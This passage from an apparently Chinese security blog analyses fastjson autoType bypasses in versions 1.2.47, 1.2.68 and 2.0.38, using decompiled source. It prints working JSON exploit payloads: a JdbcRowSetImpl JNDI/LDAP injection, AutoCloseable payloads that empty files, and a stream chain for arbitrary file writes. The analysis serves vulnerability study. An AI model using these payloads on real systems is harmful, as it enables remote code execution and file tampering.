<span class="type">int</span> i;</span><br><span class="line">                <span class="comment">// autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    hash = h3;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                        hash ^= (<span class="type">long</span>)className.charAt(i);</span><br><span class="line">                        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                <span class="comment">// 在对比 denyHashCodes 进行黑名单匹配</span></span><br><span class="line">                <span class="comment">// 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类</span></span><br><span class="line">                <span class="comment">// 则抛出异常</span></span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">  <span class="comment">// 尝试在 TypeUtils.mappings 中查找缓存的 class</span></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">                &#125;</span><br><span class="line">   <span class="comment">// 尝试在 deserializers 中查找这个类</span></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = <span class="built_in">this</span>.deserializers.findClass(typeName);</span><br><span class="line">                &#125;</span><br><span class="line"> <span class="comment">// 如果找到了对应的 class，则会进行 return</span></span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      <span class="comment">// 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                        hash = h3;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">                            hash ^= (<span class="type">long</span>)c;</span><br><span class="line">                            hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                            <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        <span class="comment">// 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类</span></span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这就和之前那个逻辑不一样了,之前就是直接报错了,这里还要判断缓存了再报错。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。</p>
<p>在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？</p>
<p>先看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
<ul>
<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
</ul>
<p>因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 <code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
<p>同样的，这个方法从 <code>TypeUtils.mappings</code> 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
<ul>
<li><code>addBaseClassMappings()</code>：无入参，加载</li>
<li><code>loadClass()</code>：关键函数</li>
</ul>
<p>先看怎么能调用loadclass方法</p>
<p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 方法中,这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，成为了我们的入口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.deserializers.put(Class.class, MiscCodec.instance);</span><br></pre></td></tr></table></figure>

<p>如果 <code>parser.resolveStatus</code> 为<code>2</code> 时，进入 if 语句，会解析 “val” 中的内容放入 objVal 中，然后传入 strVal 中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == <span class="number">2</span>) &#123;</span><br><span class="line">    parser.resolveStatus = <span class="number">0</span>;</span><br><span class="line">    parser.accept(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line">    parser.accept(<span class="number">17</span>);</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">    parser.accept(<span class="number">13</span>);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>后面的逻辑如果 class 是 <code>Class.class</code> 时，将会调用 <code>loadClass</code> 方法，将 strVal 进行类加载并缓存：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">                           <span class="keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">                       &#125; </span><br></pre></td></tr></table></figure>

<p>这就完成了恶意类的加载，组成了我们所有的恶意调用链。但是如何在第二步进入 if 语句呢？这中间的调用链是什么样的呢？我们先构造一个 json ：<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;&#125;</code> ，调试一下：</p>
<p>由于 deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>
<p><img src="https://baicany.github.io/images/image-20231128162814176.png" alt="image-20231128162814176"></p>
<p><code>DefaultJSONParser.parseObject()</code> 设置 resolveStatus 为 2</p>
<p><img src="https://baicany.github.io/images/image-20231128162835343.png" alt="image-20231128162835343"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 “val” 将会报错。</p>
<p><img src="https://baicany.github.io/images/image-20231128163024678.png" alt="image-20231128163024678"></p>
<p>然后进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">	<span class="keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后会调用重载方法,默认开启缓存</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在cache为true下,就能讲我们类加载进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">    <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;baicany\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;ycxlo\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:9999/baicany\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parse(json);</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h3><p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。</p>
<blockquote>
<p>影响版本：<code>fastjson &lt;= 1.2.68</code> 描述：利用 expectClass 绕过 <code>checkAutoType()</code> ，实际上也是为了绕过安全检查的思路的延伸。主要使用 <code>Throwable</code> 和 <code>AutoCloseable</code> 进行绕过。</p>
</blockquote>
<p>版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code> 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">safeModeMask</span> <span class="operator">=</span> Feature.SafeMode.mask;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">safeMode</span> <span class="operator">=</span> <span class="built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (safeMode) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;safeMode not support autoType : &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过 <code>checkAutoType()</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们需要一个在mappings或者白名单的类并且是Throwable子类,并且能提供我们利用的方法不然首先就解决不了<code>clazz != null</code>的问题</p>
<p>还有一种方式就是</p>
<p>这种就是不需要有这个clazz了</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (expectClass != <span class="built_in">Object</span>.<span class="keyword">class</span> &amp;&amp; expectClass != Serializable.<span class="keyword">class</span> &amp;&amp; expectClass != Cloneable.<span class="keyword">class</span> &amp;&amp; expectClass != Closeable.<span class="keyword">class</span> &amp;&amp; expectClass != EventListener.<span class="keyword">class</span> &amp;&amp; expectClass != <span class="built_in">Iterable</span>.<span class="keyword">class</span> &amp;&amp; expectClass != Collection.<span class="keyword">class</span>) &#123;</span><br><span class="line">    expectClassFlag = <span class="keyword">true</span>;</span><br><span class="line">&#125; </span><br><span class="line">...</span><br><span class="line">                        <span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">                            boolean cacheClass = autoTypeSupport || jsonType;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, cacheClass);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h4><p>接下来我们找一下 <code>checkAutoType()</code> 几个重载方法是否有可控的 <code>expectClass</code> 的入参方式，最终找到了以下几个类：</p>
<ul>
<li><code>ThrowableDeserializer#deserialze()</code></li>
<li><code>JavaBeanDeserializer#deserialze()</code></li>
</ul>
<p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的值传入 <code>checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">    exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br><span class="line">    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在check之后就会实例化我们的对象了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ex = <span class="built_in">this</span>.createException(message, cause, exClass);</span><br><span class="line">    <span class="keyword">if</span> (ex == <span class="literal">null</span>) &#123;</span><br><span class="line">        ex = <span class="keyword">new</span> <span class="title class_">Exception</span>(message, cause);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="AutoCloseable"><a href="#AutoCloseable" class="headerlink" title="AutoCloseable"></a>AutoCloseable</h4><p>commons-io 2.4 ，fastjson 1.2.68</p>
<p> TypeUtils.mappings 中含有相当多的类，其中就包括了接口 <code>java.lang.AutoCloseable</code></p>
<p>该类型使用的是<code>JavaBeanDeserializer</code>反序列化器，在通过该反序列化器实例化对象时由于该类型为接口，将会继续解析下一个JSON字段，如果存在且为类型，则将 <code>java.lang.AutoCloseable</code> 作为 expectClass 参数传入checkAutoType检测下一个类型是否合法,在上面分析过,差不多</p>
<p>这2个payload就…,</p>
<p>AutoCloseable 清空指定文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>AutoCloseable 清空指定文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>AutoCloseable 任意文件写入</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempBuffer&quot;</span><span class="punctuation">:</span><span class="string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sink&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">38</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Fastjson2-黑名单-Bypass-与利用"><a href="#Fastjson2-黑名单-Bypass-与利用" class="headerlink" title="Fastjson2 黑名单 Bypass 与利用"></a>Fastjson2 黑名单 Bypass 与利用</h2><p>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.alibaba.fastjson2&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;fastjson2&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;<span class="number">2.0</span><span class="number">.38</span>&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>这个版本和之前并不一样了,只是parse(stirng)的话,就不会调用set方法了,并且只有开了支持自定义反序列化</p>
<p>调试跟进到ObjectReaderImplObject.readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                jsonReader.nextIfObjectStart();</span><br><span class="line">                <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">                <span class="keyword">if</span> (jsonReader.isString()) &#123;</span><br><span class="line">                    hash = jsonReader.readFieldNameHashCode();</span><br><span class="line">                    <span class="keyword">if</span> (hash == HASH_TYPE) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">supportAutoType</span> <span class="operator">=</span> context.isEnabled(Feature.SupportAutoType);</span><br><span class="line">                        ObjectReader autoTypeObjectReader;</span><br><span class="line">                        <span class="keyword">if</span> (supportAutoType) &#123;</span><br></pre></td></tr></table></figure>

<p>这里会判断一个是不是type的hash,是的话就会判断是否支持自定义反序列化</p>
<p>如果不支持就会</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                            typeName = jsonReader.readString();</span><br><span class="line">                            autoTypeObjectReader = context.getObjectReaderAutoType(typeName, (Class)<span class="literal">null</span>);</span><br><span class="line">                            <span class="keyword">if</span> (autoTypeObjectReader == <span class="literal">null</span> &amp;&amp; jsonReader.getContext().isEnabled(Feature.ErrorOnNotSupportAutoType)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(jsonReader.info(<span class="string">&quot;autoType not support : &quot;</span> + typeName));</span><br><span class="line">                            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进getObjectReaderAutoType方法到getObjectReader方法,首先会checkAutoType,跟进</p>
<p>开启了保护模式的话就肯定不行,没开启的话,类名不能大于192,第一个字符是[会去除了,再检查一遍,再判断是不是期望的类,是的话就会触发afterAutoType方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (SAFE_MODE) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">typeNameLength</span> <span class="operator">=</span> typeName.length();</span><br><span class="line">    <span class="keyword">if</span> (typeNameLength &gt;= <span class="number">192</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">componentTypeName</span> <span class="operator">=</span> typeName.substring(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">this</span>.checkAutoType(componentTypeName, (Class)<span class="literal">null</span>, features);</span><br><span class="line">        &#125;<span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.getName().equals(typeName)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.afterAutoType(typeName, expectClass);</span><br><span class="line">            <span class="keyword">return</span> expectClass;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>如果不是期待类的话,会判断是否支持autoTypeSupport,</p>
<p>支持的话,还是和之前一样跟白名单,和黑名单比较,然后送进afterAutoType函数,但是这里并没有像之前一堆hash判断 [ L ;了！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> (features &amp; Feature.SupportAutoType.mask) != <span class="number">0L</span>;</span><br><span class="line">                        Class clazz;</span><br><span class="line">                        <span class="type">long</span> hash;</span><br><span class="line">                        <span class="type">int</span> i;</span><br><span class="line">                        <span class="type">char</span> ch;</span><br><span class="line">                        <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">                            hash = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; typeNameLength; ++i) &#123;</span><br><span class="line">                                ch = typeName.charAt(i);</span><br><span class="line">                                <span class="keyword">if</span> (ch == <span class="string">&#x27;$&#x27;</span>) &#123;</span><br><span class="line">                                    ch = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                hash ^= (<span class="type">long</span>)ch;</span><br><span class="line">                                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                                <span 